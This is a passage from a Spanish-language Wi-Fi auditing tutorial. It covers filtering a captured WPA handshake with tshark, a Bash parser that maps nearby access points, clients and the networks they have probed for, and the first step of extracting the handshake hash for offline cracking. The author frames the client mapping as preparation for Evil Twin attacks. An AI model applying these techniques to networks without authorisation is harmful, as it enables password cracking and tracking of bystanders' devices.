   40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
   42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
  112   8.252481 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
  113   8.259649 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
  114   8.261696 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=....R..., BI=100, SSID=hacklab
  115   8.272449 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
```

Otra buena práctica y consejo es acostumbrarnos a hacer estas filtraciones indicando el BSSID de la red
objetivo, así evitamos confusiones y estar filtrando paquetes que no corresponden.

Para este caso, como sabemos que la dirección MAC del AP es **20:34:fb:b1:c5:53** (lo podemos ver desde
Pyrit), una buena práctica sería hacer lo siguiente:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y &quot;(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;&amp; wlan.addr==20:34:fb:b1:c5:53&quot; 2&gt;/dev/null
    1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab
    3   0.374849 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2287, FN=0, Flags=........, BI=100, SSID=hacklab
    5   0.586817 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    6   0.590400 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    7   0.594497 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    8   0.596543 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
    9   0.600640 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
   10   0.602688 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
   11   0.605759 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
   12   0.610367 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
   13   4.188928 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 229 Probe Response, SN=1935, FN=0, Flags=........, BI=100, SSID=hacklab
   34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
   36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
   40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
   42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
  112   8.252481 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
  113   8.259649 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
  114   8.261696 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=....R..., BI=100, SSID=hacklab
  115   8.272449 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
```

Por último y para que no os asustéis, fijaros qué curioso:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y &quot;(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;&amp; wlan.addr==20:34:fb:b1:c5:53&quot; -w filteredCapture 2&gt;/dev/null
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #aircrack-ng filteredCapture 
Opening filteredCapture wait...
Unsupported file format (not a pcap or IVs file).
Read 0 packets.

No networks found, exiting.


Quitting aircrack-ng...
```

La suite de **aircrack-ng**, debería ser capaz de distinguirnos el punto de acceso y el Handshake capturado,
hemos visto que **Pyrit** lo detecta sin problemas, ¿por qué aircrack no?, la respuesta es sencilla. A la hora
de exportar la captura desde **tshark**, si queremos que **aircrack** nos lo interprete, debemos de
especificar en el modo de exportación para la captura el formato **pcap**, de la siguiente forma:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -R &quot;(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;&amp; wlan.addr==20:34:fb:b1:c5:53&quot; -2 -w filteredCapture -F pcap 2&gt;/dev/null
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #aircrack-ng filteredCapture 
Opening filteredCapture wait...
Read 19 packets.

   #  BSSID              ESSID                     Encryption

   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)

Choosing first network as target.

Opening filteredCapture wait...
Read 19 packets.

1 potential targets
```

Destacar que he hecho uso del parámetro '**-R**' en vez del '**-Y**' porque estoy haciendo uso del parámetro
'**-2**', con el objetivo de hacer un doble pase durante la fase de análisis. Esta opción es incluso mejor,
dado que se recopilan las anotaciones. El uso del parámetro '**-R**' requiere de forma obligatoria que
añadamos el parámetro '**-2**'.

Os dejo por aquí una pequeña aclaratoria de la utilidad de estos parámetros: &lt;a href=&quot;https://osqa-ask.wireshark.org/questions/19794/what-is-the-meaning-of-two-pass-analysis&quot;&gt;Interés&lt;/a&gt;

### Parseador para redes del entorno

Hasta ahora hemos estado parseando redes específicas, pero, ¿no te has parado a pensar en que también
podríamos hacer esto?:

* airodump-ng wlan0mon -w Captura

Es decir, capturar todo el tráfico de todas las redes disponibles en el entorno en un fichero. ¿Por qué íbamos
a querer hacer esto?, bueno, desde **airodump-ng**, en el momento de escanear las redes del entorno, lo vemos
todo claro, bien representado, sin embargo, una vez las evidencias son exportadas al fichero especificado, ya
la manera de representar los datos no son los mismos.

Por ello, os comparto el siguiente script en Bash:

```bash
#!/bin/bash

if [[ &quot;$1&quot; &amp;&amp; -f &quot;$1&quot; ]]; then
    FILE=&quot;$1&quot;
else
    echo -e '\nEspecifica el fichero .csv a analizar\n';
    echo 'Uso:';
    echo -e &quot;\t./parser.sh Captura-01.csv\n&quot;;
    exit  
fi

test -f oui.txt 2&gt;/dev/null

if [ &quot;$(echo $?)&quot; == &quot;0&quot; ]; then
  
    echo -e &quot;\n\033[1mNúmero total de puntos de acceso: \033[0;31m`grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\&quot;%;-]+,){14}' $FILE | wc -l`\e[0m&quot;
    echo -e &quot;\033[1mNúmero total de estaciones: \033[0;31m`grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\&quot;%;-]+,){5} ([A-Z0-9:]{17})|(not associated)' $FILE | wc -l`\e[0m&quot;
    echo -e &quot;\033[1mNúmero total de estaciones no asociadas: \033[0;31m`grep -E '(not associated)' $FILE | wc -l`\e[0m&quot;
    
    echo -e &quot;\n\033[0;36m\033[1mPuntos de acceso disponibles:\e[0m\n&quot;
    
    while read -r line ; do
    
        if [ &quot;`echo &quot;$line&quot; | cut -d ',' -f 14`&quot; != &quot; &quot; ]; then
            echo -e &quot;\033[1m&quot; `echo -e &quot;$line&quot; | cut -d ',' -f 14` &quot;\e[0m&quot;
        else
            echo -e &quot; \e[3mNo es posible obtener el nombre de la red (ESSID)\e[0m&quot;
        fi
    
        fullMAC=`echo &quot;$line&quot; | cut -d ',' -f 1`
        echo -e &quot;\tDirección MAC: $fullMAC&quot;
    
        MAC=`echo &quot;$fullMAC&quot; | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`
    
        result=&quot;$(grep -i -A 1 ^$MAC ./oui.txt)&quot;;
    
        if [ &quot;$result&quot; ]; then
            echo -e &quot;\tVendor: `echo &quot;$result&quot; | cut -f 3`&quot;
        else
            echo -e &quot;\tVendor: \e[3mInformación no encontrada en la base de datos\e[0m&quot;
        fi
    
        is5ghz=`echo &quot;$line&quot; | cut -d ',' -f 4 | grep -i -E '36|40|44|48|52|56|60|64|100|104|108|112|116|120|124|128|132|136|140'`
    
        if [ &quot;$is5ghz&quot; ]; then
            echo -e &quot;\t\033[0;31mOpera en 5 GHz!\e[0m&quot;
        fi
    
        printonce=&quot;\tEstaciones:&quot;
    
        while read -r line2 ; do
    
            clientsMAC=`echo $line2 | grep -E &quot;$fullMAC&quot;`
            if [ &quot;$clientsMAC&quot; ]; then
    
                if [ &quot;$printonce&quot; ]; then
                    echo -e $printonce
                    printonce=''
                fi
    
                echo -e &quot;\t\t\033[0;32m&quot; `echo $clientsMAC | cut -d ',' -f 1` &quot;\e[0m&quot;
                MAC2=`echo &quot;$clientsMAC&quot; | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`
    
                result2=&quot;$(grep -i -A 1 ^$MAC2 ./oui.txt)&quot;;
    
                if [ &quot;$result2&quot; ]; then
                    echo -e &quot;\t\t\tVendor: `echo &quot;$result2&quot; | cut -f 3`&quot;
                    ismobile=`echo $result2 | grep -i -E 'Olivetti|Sony|Mobile|Apple|Samsung|HUAWEI|Motorola|TCT|LG|Ragentek|Lenovo|Shenzhen|Intel|Xiaomi|zte'`
                    warning=`echo $result2 | grep -i -E 'ALFA|Intel'`
                    if [ &quot;$ismobile&quot; ]; then
                        echo -e &quot;\t\t\t\033[0;33mEs probable que se trate de un dispositivo móvil\e[0m&quot;
                    fi
    
                    if [ &quot;$warning&quot; ]; then
                        echo -e &quot;\t\t\t\033[0;31;5;7mEl dispositivo soporta el modo monitor\e[0m&quot;
                    fi
    
                else
                    echo -e &quot;\t\t\tVendor: \e[3mInformación no encontrada en la base de datos\e[0m&quot;
                fi
    
                probed=`echo $line2 | cut -d ',' -f 7`
    
                if [ &quot;`echo $probed | grep -E [A-Za-z0-9_\\-]+`&quot; ]; then
                    echo -e &quot;\t\t\tRedes a las que el dispositivo ha estado asociado: $probed&quot;
                fi        
            fi
        done &lt; &lt;(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\&quot;%;-]+,){5} ([A-Z0-9:]{17})|(not associated)' $FILE)
        
    done &lt; &lt;(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\&quot;%;-]+,){14}' $FILE)
    
    echo -e &quot;\n\033[0;36m\033[1mEstaciones no asociadas:\e[0m\n&quot;
    
    while read -r line2 ; do
    
        clientsMAC=`echo $line2  | cut -d ',' -f 1`
    
        echo -e &quot;\033[0;31m&quot; `echo $clientsMAC | cut -d ',' -f 1` &quot;\e[0m&quot;
        MAC2=`echo &quot;$clientsMAC&quot; | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`
    
        result2=&quot;$(grep -i -A 1 ^$MAC2 ./oui.txt)&quot;;
    
        if [ &quot;$result2&quot; ]; then
            echo -e &quot;\tVendor: `echo &quot;$result2&quot; | cut -f 3`&quot;
            ismobile=`echo $result2 | grep -i -E 'Olivetti|Sony|Mobile|Apple|Samsung|HUAWEI|Motorola|TCT|LG|Ragentek|Lenovo|Shenzhen|Intel|Xiaomi|zte'`
            warning=`echo $result2 | grep -i -E 'ALFA|Intel'`
            if [ &quot;$ismobile&quot; ]; then
                echo -e &quot;\t\033[0;33mEs probable que se trate de un dispositivo móvil\e[0m&quot;
            fi
            if [ &quot;$warning&quot; ]; then
                echo -e &quot;\t\033[0;31;5;7mEl dispositivo soporta el modo monitor\e[0m&quot;
            fi
        else
            echo -e &quot;\tVendor: \e[3mInformación no encontrada en la base de datos\e[0m&quot;
        fi
    
        probed=`echo $line2 | cut -d ',' -f 7`
    
        if [ &quot;`echo $probed | grep -E [A-Za-z0-9_\\-]+`&quot; ]; then
            echo -e &quot;\tRedes a las que el dispositivo ha estado asociado: $probed&quot;
        fi        
    
    done &lt; &lt;(grep -E '(not associated)' $FILE)
else
    echo -e &quot;\n[!] Archivo oui.txt no encontrado, descárgalo desde aquí: http://standards-oui.ieee.org/oui/oui.txt\n&quot;
fi
```

Aprovechando el fichero '.csv' generado automáticamente tras correr **airodump** sobre la red objetivo,
podemos hacer uso de este parseador para representar toda la información de los datos capturados.

Correr el script es bastante sencillo:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #./file.sh 

Especifica el fichero .csv a analizar

Uso:
	./parser.sh Captura-01.csv

┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #./file.sh captura-01.csv 

[!] Archivo oui.txt no encontrado, descárgalo desde aquí: http://standards-oui.ieee.org/oui/oui.txt
```

Como vemos, la primera vez que lo corremos, en caso de no contar con el fichero 'oui.txt', se genera un
pequeño aviso para avisar de que necesitamos descargarlo para correr el script, pues en caso contrario los
datos no serán bien representados.

Por tanto:

* wget http://standards-oui.ieee.org/oui/oui.txt

Una vez hecho, ya podemos ejecutar el script, obteniendo los siguientes resultados:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #./file.sh captura-01.csv 

Número total de puntos de acceso: 43
Número total de estaciones: 5
Número total de estaciones no asociadas: 5

Puntos de acceso disponibles:

 Invitados 
	Dirección MAC: 4C:96:14:2C:42:82
	Vendor: Juniper Networks
 MiFibra-CECC 
	Dirección MAC: 44:FE:3B:FE:CE:CE
	Vendor: Arcadyan Corporation
 WIFI_EXT 
	Dirección MAC: 4C:96:14:2C:42:86
	Vendor: Juniper Networks
 MOVISTAR_A908 
	Dirección MAC: FC:B4:E6:99:A9:09
	Vendor: ASKEY COMPUTER CORP
 No es posible obtener el nombre de la red (ESSID)
	Dirección MAC: 00:9A:CD:E7:C0:24
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
 MiFibra-91BD 
	Dirección MAC: 70:4F:57:9F:9A:8B
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 Interno 
	Dirección MAC: 4C:96:14:2C:42:80
	Vendor: Juniper Networks
 MOVISTAR_171B 
	Dirección MAC: 78:29:ED:9D:17:1C
	Vendor: ASKEY COMPUTER CORP
 JAZZTEL_1301. 
	Dirección MAC: 00:B6:B7:36:06:0C
	Vendor: Información no encontrada en la base de datos
 WIFI_EXT2 
	Dirección MAC: 44:48:C1:F1:97:03
	Vendor: Hewlett Packard Enterprise
 Interno 
	Dirección MAC: 4C:96:14:2C:47:40
	Vendor: Juniper Networks
	Estaciones:
		 4C:96:14:2C:47:40 
			Vendor: Juniper Networks
			Redes a las que el dispositivo ha estado asociado: MAPFRE
 iMovil 
	Dirección MAC: 4C:96:14:27:B9:84
	Vendor: Juniper Networks
 MOVISTAR_9E71 
	Dirección MAC: 94:91:7F:0E:9E:72
	Vendor: ASKEY COMPUTER CORP
 MiFibra-7BB4 
	Dirección MAC: 94:6A:B0:60:7B:B6
	Vendor: Arcadyan Corporation
 MOVISTAR_D8C1 
	Dirección MAC: 1C:B0:44:50:D8:C2
	Vendor: ASKEY COMPUTER CORP
 MiFibra-226A 
	Dirección MAC: 94:6A:B0:9B:22:6C
	Vendor: Arcadyan Corporation
 MOVISTAR_4DE8 
	Dirección MAC: 78:29:ED:22:4D:E9
	Vendor: ASKEY COMPUTER CORP
 Interno 
	Dirección MAC: 4C:96:14:27:B9:80
	Vendor: Juniper Networks
 WIFI_EXT 
	Dirección MAC: 4C:96:14:27:B9:86
	Vendor: Juniper Networks
 Invitados 
	Dirección MAC: A8:D0:E5:C1:C9:42
	Vendor: Juniper Networks
 iMovil 
	Dirección MAC: A8:D0:E5:C1:C9:44
	Vendor: Juniper Networks
 Invitados 
	Dirección MAC: 4C:96:14:27:B9:82
	Vendor: Juniper Networks
 WIFI_EXT 
	Dirección MAC: 4C:96:14:2C:47:46
	Vendor: Juniper Networks
 Interno 
	Dirección MAC: A8:D0:E5:C1:C9:40
	Vendor: Juniper Networks
 vodafone18AC 
	Dirección MAC: 24:DF:6A:10:18:B4
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
 MOVISTAR_3126 
	Dirección MAC: CC:D4:A1:0C:31:28
	Vendor: MitraStar Technology Corp.
 WIFI_EXT 
	Dirección MAC: A8:D0:E5:C1:C9:46
	Vendor: Juniper Networks
 Orange-A238 
	Dirección MAC: 50:7E:5D:2F:A2:3A
	Vendor: Arcadyan Technology Corporation
 MOVISTAR_1083 
	Dirección MAC: F8:8E:85:43:10:84
	Vendor: Comtrend Corporation
 MIWIFI_2G_2Xhs 
	Dirección MAC: E4:CA:12:96:21:FE
	Vendor: zte corporation
 Interno2 
	Dirección MAC: 44:48:C1:F1:96:A0
	Vendor: Hewlett Packard Enterprise
 WLAN_4A4C 
	Dirección MAC: 00:1A:2B:AC:0B:CF
	Vendor: Ayecom Technology Co., Ltd.
 iMovil2 
	Dirección MAC: 44:48:C1:F1:96:A4
	Vendor: Hewlett Packard Enterprise
 MOVISTAR_2F95 
	Dirección MAC: E8:D1:1B:21:2F:96
	Vendor: ASKEY COMPUTER CORP
 MOVISTAR_5A18 
	Dirección MAC: A4:2B:B0:FB:90:D1
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 WIFI_EXT2 
	Dirección MAC: 44:48:C1:F1:96:A3
	Vendor: Hewlett Packard Enterprise
 No es posible obtener el nombre de la red (ESSID)
	Dirección MAC: 44:48:C1:F1:96:A1
	Vendor: Hewlett Packard Enterprise
 VILLACRISIS 
	Dirección MAC: 84:16:F9:5B:45:B8
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 No es posible obtener el nombre de la red (ESSID)
	Dirección MAC: 44:48:C1:F1:96:A2
	Vendor: Hewlett Packard Enterprise
 MOVISTAR_4C30 
	Dirección MAC: E2:41:36:08:4C:30
	Vendor: Información no encontrada en la base de datos
 TP-LINK_79D4 
	Dirección MAC: D4:6E:0E:F8:79:D4
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 MOVISTAR_1677 
	Dirección MAC: 1C:B0:44:D4:16:78
	Vendor: ASKEY COMPUTER CORP
 No es posible obtener el nombre de la red (ESSID)
	Dirección MAC: 4C:1B:86:02:54:EA
	Vendor: Arcadyan Corporation

Estaciones no asociadas:

 34:12:F9:77:49:5E 
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
	Es probable que se trate de un dispositivo móvil
	Redes a las que el dispositivo ha estado asociado: BUY&amp;RECICLE
 00:24:2B:BC:4E:57 
	Vendor: Hon Hai Precision Ind. Co.,Ltd.
	Redes a las que el dispositivo ha estado asociado: MAPFRE
 10:44:00:9C:76:66 
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
	Es probable que se trate de un dispositivo móvil
 4C:96:14:2C:47:40 
	Vendor: Juniper Networks
	Redes a las que el dispositivo ha estado asociado: MAPFRE
 AC:D1:B8:17:91:C0 
	Vendor: Hon Hai Precision Ind. Co.,Ltd.
```

¡Qué belleza!, de bastante utilidad incluso para visualizar los paquetes **Probe Request**, contemplando las
redes a las que el cliente ha estado conectado en el pasado, pudiendo así posteriormente efectuar un ataque de
tipo **Evil Twin**, que veremos más adelante.

### Análisis de paquetes de red con tshark

Hasta ahora hemos estado viendo diversos modos de filtro con **tshark** pero sin dedicar una sección
específica para los modos de filtro. A continuación, vamos a ver distintos modos de filtrado, de utilidad para
el análisis de paquetes y capturas:

* Paquetes Probe Request

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==4&quot; 2&gt;/dev/null
  175 22.140053472 JuniperN_2c:47:40 → Broadcast    802.11 178 Probe Request, SN=2376, FN=0, Flags=........C, SSID=WLAN_C311
  185 26.153075819 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, SN=1959, FN=0, Flags=........C, SSID=Wlan1
  186 26.234864238 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, SN=1963, FN=0, Flags=........C, SSID=Wlan1
  187 26.245021241 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, SN=1964, FN=0, Flags=........C, SSID=Wlan1
  188 26.257907684 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, SN=1965, FN=0, Flags=........C, SSID=Wlan1
  189 26.268055504 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, SN=1966, FN=0, Flags=........C, SSID=Wlan1
```

* Paquetes Probe Response

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==5&quot; 2&gt;/dev/null
    2   1.617473 XiaomiCo_b1:c5:53 → 32:7d:a9:4f:21:99 802.11 229 Probe Response, SN=1872, FN=0, Flags=........, BI=100, SSID=hacklab
    5   1.628735 XiaomiCo_b1:c5:53 → 32:7d:a9:4f:21:99 802.11 229 Probe Response, SN=1874, FN=0, Flags=........, BI=100, SSID=hacklab
   10   3.698368 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, SN=2340, FN=0, Flags=........, BI=100, SSID=hacklab
   12   3.701951 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, SN=2341, FN=0, Flags=........, BI=100, SSID=hacklab
   14   3.756735 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, SN=2342, FN=0, Flags=........, BI=100, SSID=hacklab
   16   3.759295 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 210 Probe Response, SN=2343, FN=0, Flags=........, BI=100, SSID=hacklab
```

* Paquetes Association Request

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==0&quot; 2&gt;/dev/null
   22   5.041479 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 802.11 122 Association Request, SN=227, FN=0, Flags=........, SSID=hacklab
```

* Paquetes Association Response

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==1&quot; 2&gt;/dev/null
   24   5.049663 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 127 Association Response, SN=2346, FN=0, Flags=........
```

* Paquetes Beacon

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==8&quot; 2&gt;/dev/null
    1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, SN=1855, FN=0, Flags=........, BI=100, SSID=hacklab
```

* Paquete Authentication

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==11&quot; 2&gt;/dev/null
   18   5.033280 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 802.11 30 Authentication, SN=226, FN=0, Flags=........
   20   5.035840 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 30 Authentication, SN=2344, FN=0, Flags=........
```

* Paquetes Deauthentication

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==12&quot; 2&gt;/dev/null
  200 39.994017471 AskeyCom_d4:16:78 → Broadcast    802.11 38 Deauthentication, SN=0, FN=0, Flags=........
  201 39.994777432 AskeyCom_d4:16:78 → Broadcast    802.11 39 Deauthentication, SN=0, FN=0, Flags=........
  202 39.996199413    Broadcast → AskeyCom_d4:16:78 802.11 38 Deauthentication, SN=1, FN=0, Flags=........
  203 39.996798243    Broadcast → AskeyCom_d4:16:78 802.11 39 Deauthentication, SN=1, FN=0, Flags=........
  205 39.999554640 AskeyCom_d4:16:78 → Broadcast    802.11 38 Deauthentication, SN=2, FN=0, Flags=........
  206 40.000174666 AskeyCom_d4:16:78 → Broadcast    802.11 39 Deauthentication, SN=2, FN=0, Flags=........
```

* Paquetes Dissasociation

```bash
tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==10&quot; 2&gt;/dev/null # Para este caso no pude pillar ninguno jeje
```

* Paquetes Clear To Send (CTS)

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==28&quot; 2&gt;/dev/null
  183 11.333769733              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  186 11.334796342              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  189 11.336432358              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  192 11.339134653              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  196 11.352502740              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  199 11.357122880              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  204 11.362841524              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  222 11.418923972              → AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C
  224 11.419977797              → AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C
  226 11.427114234              → AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C
  230 11.427645439              → AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C
  235 11.430118052              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  240 11.434558344              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  243 11.435567660              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  246 11.441881524              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
```

* Paquetes ACK

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==29&quot; 2&gt;/dev/null
   44 2.532918866              → XiaomiCo_d0:51:c5 (a4:50:46:d0:51:c5) (RA) 802.11 70 Acknowledgement, Flags=........C
  213 4.870822127              → 72:4f:56:d5:f4:21 (72:4f:56:d5:f4:21) (RA) 802.11 70 Acknowledgement, Flags=........C
  214 4.872287210              → 72:4f:56:27:f7:f5 (72:4f:56:27:f7:f5) (RA) 802.11 70 Acknowledgement, Flags=........C
  215 4.873060680              → 72:4f:56:d5:f4:21 (72:4f:56:d5:f4:21) (RA) 802.11 70 Acknowledgement, Flags=........C
  231 5.792287268              → Pegatron_5b:42:f6 (38:60:77:5b:42:f6) (RA) 802.11 70 Acknowledgement, Flags=........C
  252 6.105136504              → Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C
  254 6.109740279              → HewlettP_f1:96:a3 (44:48:c1:f1:96:a3) (RA) 802.11 70 Acknowledgement, Flags=........C
  268 6.137270470              → Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C
  279 6.161518783              → Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C
  281 6.165512928              → Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C
```

#### Extracción del Hash en el Handshake

Aunque no es necesario, por si queremos saber con qué estamos trabajando, es posible extraer el Hash
correspondiente a la captura donde se encuentra nuestro Handshake.

Qué mejor que ver nuestro Handshake representado en formato Hash, tanto que hemos hablado de él como para no
prestarle un poco más de atención. Actualmente, **aircrack-ng** cuenta con el parámetro '**-J**', de utilidad
para generar un archivo de '**.hccap**'.

¿Por qué queremos generar un archivo **HCCAP**?, porque luego a través de la herramienta **hccap2john**
podemos transformar ese archivo a un hash, igual que como haríamos como **ssh2john** u otra utilidad
semejante.

Por tanto, aquí una demostración:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ls
Captura-01.cap
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #aircrack-ng -J miCaptura Captura-01.cap 
Opening Captura-01.cape wait...
Read 5110 packets.

   #  BSSID              ESSID                     Encryption

   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)

Choosing first network as target.

